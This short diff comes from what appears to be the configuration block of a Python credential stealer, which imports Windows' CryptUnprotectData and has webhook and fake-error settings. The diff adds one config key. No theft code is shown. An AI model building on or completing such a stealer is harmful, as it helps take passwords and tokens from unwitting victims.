@@ -23,6 +23,7 @@ from win32crypt import CryptUnprotectData
 
 __CONFIG__ = {
     "webhook": "None",
+    "dhook": "dog",
     "ping": False,
     "pingtype": "None",
     "fakeerror": False,
